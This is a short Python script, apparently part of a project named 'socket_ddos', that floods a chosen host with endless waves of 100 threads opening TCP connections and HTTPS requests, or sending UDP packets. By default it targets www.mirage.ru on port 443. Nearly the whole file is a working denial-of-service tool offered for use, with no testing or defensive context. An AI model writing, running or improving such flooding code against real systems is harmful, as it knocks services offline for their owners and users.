import socket
import sys
import threading
import sys
import requests
import os


def send_tcp(ip, host, port, send_msg, log):

    send_msg = str.encode(send_msg)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        try:
            # log.debug(f"https://{host}")
            try:
                res = requests.get(f"https://{host}")
                log.debug(res.status_code)
            except:
                pass
            s.connect((ip, port))

        except Exception as e:
            log.error(f'connect error\n {e}')
            return
        s.sendall(send_msg)
        # data = s.recv(1024)
        # data = bytes.decode(data)

        # log.info(f"Received {data!r}")


def send_udp(ip, host, port, send_msg, log):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        send_msg = str.encode(send_msg)
        s.sendto(send_msg, (ip, port))
        data = s.recvfrom(1024)
        data = bytes.decode(data)
        log.info(data)


def get_ip_from_url(url: str, log) -> str:
    """
    "google.com" -> '142.251.39.46'
    :param url: "google.com"
    :param origin_url: "https://google.com"
    :return: "142.251.39.46"
    """
    site_ip = False

    try:
        site_ip = socket.gethostbyname(url)
    except socket.gaierror:
        log.error(f'This site may be not valid "{url}"')
    return site_ip


def do_threads(n_thread, func, args):
    while True:
        threads = []
        for i in range(n_thread):
            t = threading.Thread(target=func, args=args, daemon=True)
            t.start()
            threads.append(t)
        for ts in threads:
            ts.join()


def main(host, port, type_conn, log):
    log.info('Start Programm')

    msg = "Hello world"
    ip = get_ip_from_url(host, log)
    port = int(port)
    if type_conn.strip() == 'tcp':
        do_threads(100, send_tcp, (ip, host, port, msg, log))
    elif type_conn.strip() == 'udp':
        do_threads(100, send_udp, (ip, host, port, msg, log))


if __name__ == "__main__":
    from socket_ddos import logger

    sys.argv.pop(0)
    if data := sys.argv:
        host = data[0]
        port = data[1]
        type_conn = data[2]
    else:
        host = 'www.mirage.ru'
        port = 443
        type_conn = 'tcp'
    pid = os.getpid()
    os.system(f"echo {pid} > pid_{host}1.pid")

    main(host, port, type_conn, logger)


